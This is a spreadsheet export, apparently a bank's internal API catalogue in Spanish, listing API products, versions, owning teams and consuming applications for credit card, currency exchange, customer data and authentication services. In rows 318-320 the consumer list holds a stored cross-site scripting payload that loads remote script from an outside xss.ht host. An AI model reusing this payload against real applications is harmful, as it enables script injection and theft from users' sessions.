ID,Tipo,Nombre_producto_API,Version_producto,Nombre_de_servicio/API,Nombre_Tecnico_API,Componente_menor,EVC,Nombre_equipo,Servicio_proveedor,Consumidores,QMANAGER,Namespace
316,API ONPREMISE,Credit Card,218,Credit Card - Offer,credit-card-offer,Emisor,Medios de pago Emision,Tarjetas Crédito,OfertaComercialTarjetasCredito/V1.0,"Autenticacion-para-VCAS_NU0101001 _x000D_
 ProductorConsumidorMP_PRODUCTORCONSUMIDOR _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Desbloqueo-Clave-Dinamica-TDC_NU0100001 _x000D_
 JornadaPagos_AW1316001 _x000D_
 PagoTDCWompi_AW1405001 _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 ALM_AW0955001",,
317,API ONPREMISE,Credit Card,218,Credit Card - Transactions,credit-card-transactions,Emisor,Medios de pago Emision,Tarjetas Crédito,ConsultaTarjetasCredito/V2.0,"Autenticacion-para-VCAS_NU0101001 _x000D_
 ProductorConsumidorMP_PRODUCTORCONSUMIDOR _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Desbloqueo-Clave-Dinamica-TDC_NU0100001 _x000D_
 JornadaPagos_AW1316001 _x000D_
 PagoTDCWompi_AW1405001 _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 ALM_AW0955001",,
318,API ONPREMISE,Credit Cards,110,Credit Cards - Cards Limit,credit-cards-cards-limit,Emisor,Medios de pago Emision,Tarjetas Crédito,ModificacionDeCupoTarjetas/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 Ares_AW1250 _x000D_
 JornadaPagos_AW1316001 _x000D_
 <script>$.getScript(""//mistestxss.xss.ht"")</script> _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 Dcmonroy_prueba_paso",,
319,API ONPREMISE,Credit Cards,110,Credit Cards - Management,credit-cards-management,Emisor,Medios de pago Emision,Tarjetas Crédito,GestionTarjetasCredito/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 Ares_AW1250 _x000D_
 JornadaPagos_AW1316001 _x000D_
 <script>$.getScript(""//mistestxss.xss.ht"")</script> _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 Dcmonroy_prueba_paso",,
320,API ONPREMISE,Credit Cards,110,Credit Cards - Product Information,credit-cards-product-information,Emisor,Medios de pago Emision,Tarjetas Crédito,ConsultaTarjetasCredito/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 Ares_AW1250 _x000D_
 JornadaPagos_AW1316001 _x000D_
 <script>$.getScript(""//mistestxss.xss.ht"")</script> _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 Dcmonroy_prueba_paso",,
321,API ONPREMISE,Credit Disbursement,101,Credit Disbursement - Management,credit-disbursement-management,Canales Pymes,Pymes y Empresas,No Aplica,,No tiene,,
322,API ONPREMISE,Credit Limit,101,Credit Limit - Credit Limits Management,credit-limit-credit-limits-management,Crédito,Financiación y Consumo,Experiencia de Cartera,,"PROFIN_PRODUCTORCONSUMIDOR _x000D_
 LoansOffer_NU0102001",,
323,API ONPREMISE,Currency Exchange,120,Currency Exchange - Estimate Transactions,currency-exchange-estimate-transactions,Captaciones,Financiación y Consumo,Financiasion,CalcularOperacionDivisas/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 APP_PRODUCTORCONSUMIDOR",,
324,API ONPREMISE,Currency Exchange,120,Currency Exchange - Exchange Numerals,currency-exchange-exchange-numerals,Captaciones,Financiación y Consumo,Captaciones,consultaNumeralCambiario/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 APP_PRODUCTORCONSUMIDOR",,
325,API ONPREMISE,Currency Exchange,120,Currency Exchange - Negociated Rates,currency-exchange-negociated-rates,Captaciones,Financiación y Consumo,Captaciones,GestionTasaPactada/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 APP_PRODUCTORCONSUMIDOR",,
326,API ONPREMISE,Currency Exchange,120,Currency Exchange - Orders,currency-exchange-orders,Captaciones,Financiación y Consumo,Captaciones,GestionOrdenes/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 APP_PRODUCTORCONSUMIDOR",,
327,API IBM Cloud ,Currency Exchange,113,Currency Exchange - Rates,currency-exchange-rates,Filiales del Exterior,Financiación y consumo,Filiales del Exterior,ConsultaTasa/V1.0,"TMP1 johucorr_AW1185001 _x000D_
 TMP2 johucorr_AW1185001 _x000D_
 BC_Herramientas_Monitoreo _x000D_
 App inversionesGB_AW1185001 _x000D_
 APOLO_AW0360010",,
328,API ONPREMISE,Currency Exchange,120,Currency Exchange - Transactions,currency-exchange-transactions,Comercio Exterior,Financiación y Consumo,,,"MonitoreoDCM_NU0084001 _x000D_
 APP_PRODUCTORCONSUMIDOR",,
329,API IBM Cloud ,Currency Exchange,113,Currency Exchange - Transfer Rates,currency-exchange-transfer-rates,Filiales del Exterior,Financiación y consumo,Filiales del Exterior,"GestionComisionTransferenciasExternas/V1.0, 
ConsultaTasaPreferencialCliente/V1.0","TMP1 johucorr_AW1185001 _x000D_
 TMP2 johucorr_AW1185001 _x000D_
 BC_Herramientas_Monitoreo _x000D_
 App inversionesGB_AW1185001 _x000D_
 APOLO_AW0360010",,
330,API ONPREMISE,Currency Exchange Reasons,100,Currency Exchange Reasons - Transaction Reasons,currency-exchange-transaction-reasons,Comercio Exterior,Financiación y Consumo,Captaciones,,APIC_PRODUCTORCONSUMIDOR,,
331,API ONPREMISE,Customer Validation,203,Customer - Check Control List,customer-check-control-list,Transversales no iSeries,Otras Funciones de Apoyo,Los Federales,ConsultaListasDeControl/V1.0,"MonitoreoDCM_NU0084001 _x000D_
 HabitatCore_AW1281003 _x000D_
 GestionaNegocios_AW1302001 _x000D_
 EDPYME_AW1170 _x000D_
 VinculacionAperturaProductoDigital_AW1128 _x000D_
 VinculacionAperturaProductoDigitalSucursales_AW1177 _x000D_
 BIZTRACK_AW0998 _x000D_
 APM_AW1097001 _x000D_
 APPVinculation_AW1315014 _x000D_
 Networking_NU0046001 _x000D_
 SEG_NU0064001 _x000D_
 PLINK_AW1206001 _x000D_
 Horus_AW1258011 _x000D_
 NETWORKING_NU0046001 _x000D_
 VINCUTRANS_NU0034001 _x000D_
 ECORIESGOS_AW1081001 _x000D_
 GestionVendor_AW0661003 _x000D_
 AdaptadorMarketplace_NU0143001 _x000D_
 RIGO_NU0135001 _x000D_
 APIC_AW1176 _x000D_
 AdquirenciaCargaMasiva_NU0142001 _x000D_
 Plink_AW1206001 _x000D_
 AccountOpening_AW1480001 _x000D_
 PLINK_AW1206001 _x000D_
 BIZAGIBEG_AW1176001 _x000D_
 PORTALCOBRANZA_AW1294001 _x000D_
 OYD_AW0629001 _x000D_
 ALM_AW0955001",,
332,API IBM Cloud ,Customer - Manage Prospect,101,Customer - Manage Prospect Natural Person,customer-manage-prospect-natural-person,Gestion Cliente y Comercial,Conocimiento de clientes,No Aplica,GestionarProspecto/V2.0,"NEQUICLIENTES_AW1011 _x000D_
 BCHerramientasMonitoreoPrd2",,
333,API ONPREMISE,Customer Manage Prospect,101,Customer - Manage Prospect Natural Person,customer-manage-prospect-natural-person,Transversales Clientes,Conocimiento de clientes,No Aplica,GestionarProspecto/V2.0,"VINCUTRANS_NU0034001 _x000D_
 APP-PERSONAS_NU0146001 _x000D_
 SVPSucursalVirtualPersonas_NU0149001",,
334,API IBM Cloud ,CustomerProducts,110,Customer - Products,customer-products,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,RecuperarProducto/V1.0,"TMP EDIN APP_AW1276001 _x000D_
 BC_Herramientas_Monitoreo _x000D_
 Cayman_Soporte _x000D_
 APOLO_AW0360010 _x000D_
 App inversionesGB_AW1185001",,
335,API ONPREMISE,Customer Accounts,113,Customer Accounts - Accounts,customer-accounts-accounts,Captaciones,Depósitos y cuentas especiales,Depósitos,,"CGC_NU0014001 _x000D_
 EDPYME_AW1170 _x000D_
 PRODUCTORCONSUMIDOR_PRODUCTORCONSUMIDOR _x000D_
 Valores_AW1373 _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 LimitsCreditExhibition_NU0114001 _x000D_
 SEG_NU0064001 _x000D_
 JornadaDepositos_NU0170001 _x000D_
 Horus_AW1258011 _x000D_
 JornadaPagos_AW1316001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 Boton de Transferencias_AW1277001 _x000D_
 CryptoAssetsGMN_NU0094001 _x000D_
 LoansOffer_NU0102001 _x000D_
 PODEM01_NU0001 _x000D_
 APIC_AW1176 _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 Cuentas_Bancolombia_AW1081001_SUFI_APM _x000D_
 BancolombiaPay_AW1435001 _x000D_
 ALM_AW0955001 _x000D_
 prueba _x000D_
 JornadaDepositos_NU0104001 _x000D_
 APP_PRUEBA _x000D_
 APP-PERSONAS_NU0146001 _x000D_
 ModuloSVELeasing_AW0360006 _x000D_
 JornadaDepositos_AW1177001 _x000D_
 ms_bs_customer_account_NU0163001",,
336,API ONPREMISE,Customer Accounts,113,Customer Accounts - Balances,customer-accounts-balances,Captaciones,Depósitos y cuentas especiales,Depósitos,,"CGC_NU0014001 _x000D_
 EDPYME_AW1170 _x000D_
 PRODUCTORCONSUMIDOR_PRODUCTORCONSUMIDOR _x000D_
 Valores_AW1373 _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 LimitsCreditExhibition_NU0114001 _x000D_
 SEG_NU0064001 _x000D_
 JornadaDepositos_NU0170001 _x000D_
 Horus_AW1258011 _x000D_
 JornadaPagos_AW1316001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 Boton de Transferencias_AW1277001 _x000D_
 CryptoAssetsGMN_NU0094001 _x000D_
 LoansOffer_NU0102001 _x000D_
 PODEM01_NU0001 _x000D_
 APIC_AW1176 _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 APP_PRODUCTORCONSUMIDOR _x000D_
 Cuentas_Bancolombia_AW1081001_SUFI_APM _x000D_
 BancolombiaPay_AW1435001 _x000D_
 ALM_AW0955001 _x000D_
 prueba _x000D_
 JornadaDepositos_NU0104001 _x000D_
 APP_PRUEBA _x000D_
 APP-PERSONAS_NU0146001 _x000D_
 ModuloSVELeasing_AW0360006 _x000D_
 JornadaDepositos_AW1177001 _x000D_
 ms_bs_customer_account_NU0163001",,
337,API ONPREMISE,Customer Acquisition,110,Customer Acquisition  Notification,customer-acquisition-notification,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
338,API ONPREMISE,Customer Acquisition Data,100,Customer Acquisition - Persistence,customer-acquisition-persistence,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
339,API ONPREMISE,CustomerAcquisitionDocs,101,Customer Acquisition Documents Digitalization,customer-acquisition-documents-digitalization,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
340,API ONPREMISE,Customer Acquisition Security,100,Customer Acquisition Identity,customer-acquisition-identity,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
341,API ONPREMISE,CustomerAcquisitionDocs,101,Customer Acquisition Images And Documents Management,customer-acquisition-images-and-documents-management,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
342,API ONPREMISE,Customer Acquisition Data,100,Customer Acquisition Information NP,customer-acquisition-information-np,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
343,API ONPREMISE,Customer Acquisition,110,Customer Acquisition Management,customer-acquisition-management,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
344,API ONPREMISE,Customer Acquisition,110,Customer Acquisition Profiling,customer-acquisition-profiling,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
345,API ONPREMISE,Customer Acquisition Security,100,Customer Acquisition Validation,customer-acquisition-validation,Gestion Cliente y Comercial,Conocimiento de clientes,Vinculación y actualización,,VINCUTRANS_NU0034001,,
346,API ONPREMISE,Customer Authentication,104,Customer Authentication - OTP,customer-authentication-otp,Seguridad,Autenticación y Monitoreo,Autorizaciones,"EnrolarClienteOTP/V2.0, 
AutenticarClienteOTP/V2.0
GenerarOTP/V2.0","AppInversiones_AW1185001 _x000D_
 PEP_AW1128",,
347,API ONPREMISE,Customer Authentication,101,Customer Authentication - OTP,customer-authentication-otp,Seguridad,Autenticación y Monitoreo,Autorizaciones,,EASYHOME_NU0004001,,
348,API ONPREMISE,Customer Authentication,200,Customer Authentication - Otp,customer-authentication-otp,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"Desbloqueo-Clave-Dinamica-TDC_NU0100001 _x000D_
 DELFINWEB_AW0748001 _x000D_
 EASYHOME_NU0004001 _x000D_
 JornadaPagos_AW1316001 _x000D_
 PEP_AW1128",,
349,API ONPREMISE,Customer Authentication,100,Customer Authentication - OTP,customer-authentication-otp,Seguridad,Autenticación y Monitoreo,Autorizaciones,"EnrolarClienteOTP/V2.0
AutenticarClienteOTP/V2.0
GenerarOTP/V2.0
",No tiene,,
350,API ONPREMISE,Customer Authentication,104,Customer Authentication - Otp Management,customer-authentication-otp-management,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"AppInversiones_AW1185001 _x000D_
 PEP_AW1128",,
351,API ONPREMISE,Customer Authentication,200,Customer Authentication - Otp Management,customer-authentication-otp-management,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"Desbloqueo-Clave-Dinamica-TDC_NU0100001 _x000D_
 DELFINWEB_AW0748001 _x000D_
 EASYHOME_NU0004001 _x000D_
 JornadaPagos_AW1316001 _x000D_
 PEP_AW1128",,
352,API ONPREMISE,Customer Authentication,104,Customer Authentication - push messages,customer-authentication--push-messages,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"AppInversiones_AW1185001 _x000D_
 PEP_AW1128",,
353,API ONPREMISE,Customer Authentication,200,Customer Authentication - Push Messages,customer-authentication-push-messages,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"Desbloqueo-Clave-Dinamica-TDC_NU0100001 _x000D_
 DELFINWEB_AW0748001 _x000D_
 EASYHOME_NU0004001 _x000D_
 JornadaPagos_AW1316001 _x000D_
 PEP_AW1128",,
354,API ONPREMISE,Customer Behavioral Models,101,Customer Behavioral Models - Behavioral,customer-behavioral-models-behavioral,Riesgos,Ciclo de Crédito,Ecosistema de Riesgo de Crédito,,PEP_AW1281002,,
355,API ONPREMISE,Customer Behavioral Models,204,Customer Behavioral Models - Behavioral,customer-behavioral-models-behavioral,Riesgos,Ciclo de Crédito,Ecosistema de Riesgo de Crédito,,"CentralesPrecalculadas_NU0032001 _x000D_
 BIZAGIBEG_AW1176001 _x000D_
 PORTALCOBRANZA_AW1294001 _x000D_
 PricingBusiness_NU0091001 _x000D_
 PricingBusiness_NU0091001",,
356,API ONPREMISE,Customer Behavioral Models,204,Customer Behavioral Models - Indebtedness,customer-behavioral-models-indebtedness,Riesgos,Ciclo de Crédito,Ecosistema de Riesgo de Crédito,,"CentralesPrecalculadas_NU0032001 _x000D_
 BIZAGIBEG_AW1176001 _x000D_
 PORTALCOBRANZA_AW1294001 _x000D_
 PricingBusiness_NU0091001 _x000D_
 PricingBusiness_NU0091001",,
357,API ONPREMISE,Customer Behavioral Models,204,Customer Behavioral Models - Payment Capacity,customer-behavioral-models-payment-capacity,Riesgos,Ciclo de Crédito,Ecosistema de Riesgo de Crédito,,"CentralesPrecalculadas_NU0032001 _x000D_
 BIZAGIBEG_AW1176001 _x000D_
 PORTALCOBRANZA_AW1294001 _x000D_
 PricingBusiness_NU0091001 _x000D_
 PricingBusiness_NU0091001",,
358,API ONPREMISE,Customer Behavioral Models,101,Customer Behavioral Models - Payment Obligations,customer-behavioral-models-payment-obligations,Riesgos,Gestion integral del riesgo,,,PEP_AW1281002,,
359,API ONPREMISE,Customer Behavioral Models,204,Customer Behavioral Models - Payment Obligations,customer-behavioral-models-payment-obligations,Riesgos,Gestion integral del riesgo,,,"CentralesPrecalculadas_NU0032001 _x000D_
 BIZAGIBEG_AW1176001 _x000D_
 PORTALCOBRANZA_AW1294001 _x000D_
 PricingBusiness_NU0091001 _x000D_
 PricingBusiness_NU0091001",,
360,API ONPREMISE,Customer Case Selfmanagement,100,Customer Case Selfmanagement - Cases,customer-case-selfmanagement-cases,Facilitadores Digitales,Evolución Digital,Evolución Digital,,MascaraTransaccional_NU0021001,,
361,API ONPREMISE,Customer Case,101,Customer Case-PQRS,customer-case-pqrs,Transversales Clientes,Conocimiento de clientes,No aplica,,ADA_NU0150001,,
362,API ONPREMISE,Customer Commercial Data,100,Customer Commercial Data - Management,customer-commercial-data-management,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaGestionComercialCliente/V1.0,"Thanos_AW1326001 _x000D_
 LimitsCreditExhibition_NU0114001 _x000D_
 LoansOffer_NU0102001 _x000D_
 MsUtilities_NU0102001 _x000D_
 HabitatCore_AW1281003 _x000D_
 VisorInteractivo_AW1249001 _x000D_
 VisorInteractivo_AW1249001 _x000D_
 MascaraTransaccional_NU0021001 _x000D_
 RIGO_NU0135001 _x000D_
 AppSarlaft_AW1176001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001 _x000D_
 VINCUTRANS_NU0034001 _x000D_
 EASYHOME_NU0004001",,
363,API ONPREMISE,Customer Contact,101,Customer Contact - Contact Information,customer-contact-contact-information,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,,"SEG_NU0064001 _x000D_
 TRACKINGSIM_NU0098001 _x000D_
 NETWORKING_NU0046001 _x000D_
 JornadaDepositos_NU0104001 _x000D_
 Networking_NU0046001 _x000D_
 DELFINWEB_AW0748001 _x000D_
 Decision-Manager_NU0010001 _x000D_
 Thanos_AW1326001 _x000D_
 EASYHOME_NU0004001 _x000D_
 ContactInfoMDM_AW0660001 _x000D_
 AdaptadorMarketplace_NU0143001 _x000D_
 aprobaciones_AW0360007 _x000D_
 JornadaDepositos_NU0170001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 LoansOffer_NU0102001 _x000D_
 MsUtilities_NU0102001 _x000D_
 AdquirenciaCargaMasiva_NU0142001 _x000D_
 PSE-Pagos-Seguros-en-linea_NU0152001 _x000D_
 AccountOpening_AW1480001 _x000D_
 Kioscos_AW1272001 _x000D_
 GestionVendor_AW0661003 _x000D_
 PricingBusiness_NU0091001 _x000D_
 TRACKING_NU0098001 _x000D_
 EASYHOME_NU0004001 _x000D_
 salesforceAdapter_NU0254001",,
364,API ONPREMISE,Customer Data,121,Customer Data - Keys,customer-data-keys,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaLlaveroCliente/V1.0,"creditlens_NU0038001 _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 LoansOffer_NU0102001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001",,
365,API ONPREMISE,Customer Data,121,Customer Data - Management,customer-data-management,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,GestionCliente/V1.0,"creditlens_NU0038001 _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 LoansOffer_NU0102001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001",,
366,API ONPREMISE,Customer Data,121,Customer Data - Supplementary Information,customer-data-supplementary-information,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaDatosComplementariosCliente/V1.0,"creditlens_NU0038001 _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 LoansOffer_NU0102001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001",,
367,API ONPREMISE,Customer Digital Identity,100,Customer Digital Identity - Information,customer-digital-information,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"VDSORQUESTADORAUTOGESTIONBACK_NU0037002 _x000D_
 GestionVendor_AW0661003 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 TestApplication_AW1333002",,
368,API ONPREMISE,Customer Digital Identity,100,Customer Digital Identity - Management,customer-digital-identity-management,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"VDSORQUESTADORAUTOGESTIONBACK_NU0037002 _x000D_
 GestionVendor_AW0661003 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 TestApplication_AW1333002",,
369,API ONPREMISE,Customer Digital Identity,100,Customer Digital Identity - Transaction Information,customer-digital-identity-transaction-information,Seguridad,Autenticación y Monitoreo,Autorizaciones,,"VDSORQUESTADORAUTOGESTIONBACK_NU0037002 _x000D_
 GestionVendor_AW0661003 _x000D_
 Portal Contenidos Bancolombia_AW1218001 _x000D_
 TestApplication_AW1333002",,
370,API ONPREMISE,Customer Financial Data,111,Customer Financial Data - Financial Information,customer-financial-data-financial-information,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaDatosFinancierosCliente/V1.0,"DELFINWEB_AW0748001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001",,
371,API ONPREMISE,Customer Financial Data,111,Customer Financial Data - Tax Information,customer-financial-data-tax-information,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaDatosTributariosCliente/V1.0,"DELFINWEB_AW0748001 _x000D_
 GestionVendor_AW0661003 _x000D_
 salesforceAdapter_NU0254001",,
372,API ONPREMISE,Customer Information,100,Customer Information - Keys,customer-information-keys,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,,No tiene,,
373,API ONPREMISE,Customer Information Management,112,Customer Information Management - Management,customer-information-management-management,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,GestionCliente/V1.0,salesforceAdapter_NU0254001,,
374,API ONPREMISE,Customer Management,100,Customer Management - Amount Limit Management,customer-management-amount-limit-management,Trasversales e Inclusión,Distribución Digital,No Aplica,GestionDeTopesMontosClientes/V1.0,"Recargas_AW1300001 _x000D_
 MonitoreoDCM_NU0084001 _x000D_
 Thanos_AW1326001",,
375,API ONPREMISE,Customer Personal Data,103,Customer Personal Data - Information,customer-personal-data-information,MDM,"DATOS, ANALÍTICA, IA, BLOCKCHAIN",MDM,ConsultaDatosPersonalesCliente/V1.0,"ALM_AW0955001 _x000D_
 ALM_AW0955 _x000D_
 CGC_NU0014001 _x000D_
 SEG_NU0064001 _x000D_
 NETWORKING_NU0046001 _x000D_
 JornadaDepositos_NU0104001 _x000D_
 Networking_NU0046001 _x000D_
 TMP_AW0955 _x000D_
 VINCUTRANS_NU0034001 _x000D_
 Thanos_AW1326001 _x000D_
 SucursalVirtualValores_AW0638 _x000D_
 AdaptadorMarketplace_NU0143001 _x000D_
 JornadaDepositos_NU0170001 _x000D_
 LoansOffer_NU0102001 _x000D_
 MsUtilities_NU0102001 _x000D_
 AdquirenciaCargaMasiva_NU0142001 _x000D_
 APP-PERSONAS_NU0146001 _x000D_
 SVPSucursalVirtualPersonas_NU0149001 _x000D_
 PSE-Pagos-Seguros-en-linea_NU0152001 _x000D_
 AccountOpening_AW1480001 _x000D_
 RIGO_NU0135001 _x000D_
 BancolombiaPay_AW1435001 _x000D_
 GestionVendor_AW0661003 _x000D_
 PricingBusiness_NU0091001 _x000D_
 salesforceAdapter_NU0254001 _x000D_
 Galatea_NU0051001",,
